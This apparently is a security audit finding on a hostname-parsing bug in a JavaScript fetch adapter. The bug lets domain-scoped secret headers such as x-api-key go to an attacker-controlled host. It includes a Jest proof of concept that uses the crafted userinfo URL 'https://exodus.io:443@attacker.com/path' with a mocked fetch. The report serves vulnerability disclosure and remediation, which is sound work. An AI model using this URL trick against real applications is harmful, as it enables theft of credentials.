### Title
Host/userinfo confusion in `hostnameFromString` causes domain-scoped secret headers to be attached to attacker-controlled origins - ([File: adapters/fetch-factory/src/hostname.js])

### Finding Description
`hostnameFromString` in `adapters/fetch-factory/src/hostname.js` does its own manual string parsing of the URL instead of using the WHATWG `URL` parser. It first looks for a `:` character after the `://` separator and, if found, treats everything before it as the hostname: [1](#0-0) 

This logic assumes any `:` immediately following the scheme separator denotes a `host:port` boundary. It does not account for URL userinfo syntax (`user:password@host`), where a `:` can legitimately appear *before* an `@` character that separates userinfo from the actual host.

For a URL like `https://exodus.io:443@attacker.com/path`:
- The real network destination, as resolved by the WHATWG `URL` parser used internally by `fetch`/`node-fetch`, is `attacker.com` (with `exodus.io:443` treated as discarded userinfo).
- `hostnameFromString`, however, finds the first `:` at index 9 (right after `exodus.io`) and slices the string there, producing the substring `exodus.io`, which passes `isValidHostname`'s `domainPattern` check (since it contains only `\w`, `.`, and letters) and is returned as the resolved hostname.

This resolved hostname is then used by `FetchFactory#buildHeaders` to look up domain-scoped headers: [2](#0-1) 

Because the matched domain is `exodus.io` (or any domain configured via `setHeaders(headers, ['exodus.io'])`, including secrets whitelisted via `WHITELISTED_X_AUTH_HEADERS` such as `x-api-key`), the resulting `fetch` call attaches `exodus.io`-scoped headers/secrets while the underlying `fetchFn` actually sends the request to `attacker.com`. [3](#0-2) 

Note that the simpler userinfo-without-port case (`https://exodus.io@attacker.com/path`) is safe: `hostnameFromString` finds no `:`, falls through to the `/` branch, extracts `exodus.io@attacker.com`, and `isValidHostname` rejects it because `domainPattern` doesn't allow `@`. It is specifically the `user:pass@host` (or `host:port@host`) userinfo pattern with an early `:` that triggers the divergence, since the port-branch short-circuits and returns before the `/`/`@` characters are even considered.

### Impact Explanation
Any domain-scoped header configured via `FetchFactory#setHeaders(headers, [domain])` — including whitelisted secret-style headers like `x-api-key` (see `WHITELISTED_X_AUTH_HEADERS`) or Exodus-specific identification headers set via `setDefaultExodusIdentifierHeaders` — can be exfiltrated to an attacker-controlled host if any URL passed into a `FetchFactory`-created fetch function is attacker-influenced (e.g., derived from a dapp-provided callback URL, remote-config value, deeplink, or QR/import payload) and crafted with a userinfo segment containing a `:` before `@`. This matches the ORIGIN_SCOPING invariant violation described: header/host binding diverges from the actual network destination, causing scoped secret disclosure to an unintended host.

### Likelihood Explanation
Exploitability requires only that some caller passes an attacker-influenced URL string into a `fetch` function created by `FetchFactory` where domain-scoped secret headers are configured for the spoofed domain (e.g. `exodus.io`). No privileged state or social engineering is needed — a malicious dapp, remote-config payload, or deeplink URL containing the crafted userinfo string is sufficient. The bug is deterministic and repeatable for any URL matching the pattern `scheme://<validDomainLikeString>:<anything>@<attackerHost>/...`.

### Recommendation
Replace the manual string-slicing logic in `hostnameFromString` with the standard `URL` constructor (`new URL(url).hostname`), which correctly separates userinfo, host, and port per the WHATWG URL spec. If a lightweight parser must be kept for performance, explicitly detect and strip any userinfo segment (content before the last `@` prior to the first `/`) before searching for a port-separating `:`, and validate the extracted hostname against the same logic the actual `fetchFn`/`URL` implementation would use, so the header-matching logic can never diverge from the true request destination.

### Proof of Concept
Integration test comparing `hostnameFromString`/`getUrlHostname` output to the actual WHATWG `URL.hostname` for userinfo-bearing URLs, and demonstrating header leakage through `FetchFactory`:

```js
import { getUrlHostname } from '../src/hostname.js'
import { FetchFactory } from '../src/index.js'

test('hostname parser diverges from actual URL resolution for userinfo URLs', () => {
  const malicious = 'https://exodus.io:443@attacker.com/path'
  const parsed = getUrlHostname(malicious)
  const actual = new URL(malicious).hostname

  expect(actual).toBe('attacker.com')
  expect(parsed).toBe('exodus.io') // divergence: parser thinks it's exodus.io
  expect(parsed).not.toBe(actual)
})

test('exodus.io-scoped secret header leaks to attacker.com destination', async () => {
  const capturedUrls = []
  const fetchFn = async (url, opts) => {
    capturedUrls.push(url)
    return Object.fromEntries(opts.headers)
  }

  const factory = new FetchFactory(fetchFn)
  factory.setHeaders({ 'x-api-key': 'super-secret-exodus-key' }, ['exodus.io'])

  const result = await factory.create()('https://exodus.io:443@attacker.com/path')

  // secret header attached...
  expect(result['x-api-key']).toBe('super-secret-exodus-key')
  // ...but the request actually targets attacker.com
  expect(capturedUrls[0]).toBe('https://exodus.io:443@attacker.com/path')
  expect(new URL(capturedUrls[0]).hostname).toBe('attacker.com')
})
```

Both assertions demonstrate that `hostnameFromString` returns `exodus.io` while the real destination host (as any conforming HTTP client would resolve it) is `attacker.com`, confirming the header/host binding mismatch.

### Citations

**File:** adapters/fetch-factory/src/hostname.js (L17-23)
```javascript
  let hostname = url.slice(protocolSeparatorStart + PROTOCOL_SEPARATOR.length)

  const portIndex = hostname.indexOf(':')
  if (portIndex !== -1) {
    hostname = hostname.slice(0, portIndex)
    return isValidHostname(hostname) ? hostname : null
  }
```

**File:** adapters/fetch-factory/src/fetch-factory.js (L100-111)
```javascript
    const hostname = getUrlHostname(url)
    if (hostname) {
      const matchedDomain = Object.keys(this.headerConfigs).find((key) => {
        return hostname === key || hostname.endsWith(`.${key}`)
      })

      if (matchedDomain) {
        Object.entries(this.headerConfigs[matchedDomain]).forEach(([key, value]) => {
          headers.set(key, value)
        })
      }
    }
```

**File:** adapters/fetch-factory/src/constants.js (L1-4)
```javascript
export const WHITELISTED_HEADERS = new Set(['user-agent'])
export const WHITELISTED_X_AUTH_HEADERS = new Set(['x-api-key'])
export const EXODUS_HOST = 'exodus.io'
export const GLOBAL_HOST = '*'
```
